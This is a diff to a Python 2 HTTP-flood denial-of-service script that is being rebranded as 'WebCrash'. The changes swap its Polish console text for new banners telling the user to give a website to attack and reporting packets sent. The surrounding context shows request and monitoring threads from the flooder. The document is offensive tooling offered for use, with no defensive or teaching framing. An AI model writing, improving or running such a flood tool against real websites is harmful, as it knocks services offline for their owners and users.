@@ -60,10 +60,11 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print ' '
-	print '  Zle uzycie!'
-	print '  Poprawne: httpflood.py <url>'
-	print ' '
+	print '     WebCrash     '
+	print ''
+	print '>  Podaj strone aby zaatakowac'
+	print '>  python2 webcrash.py <website>'
+        print ' '
 
 	
 #http request
@@ -88,7 +89,10 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print '  Strona ponawia probe laczenia...'
+			print '     WebCrash      '
+                        print ' '
+                        print '>  Laczenie z WEBSOCKS...'
+                        print ' '
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -116,10 +120,10 @@ class MonitorThread(threading.Thread):
 		previous=request_counter
 		while flag==0:
 			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
+				print "%d Pakiety wyslane" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n  Rozpoczynanie atakowania..."
+			print "\n     WebCrash      \n \n> Trwa atakowanie metoda: WEBCRASH"
 
 #execute 
 if len(sys.argv) < 2:
@@ -130,7 +134,10 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "  Atakowanie strony..."
+		print "     WebCrash     "
+                print " "
+                print "> Atakowanie strony metoda: WEBCRASH. "
+                print " "
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
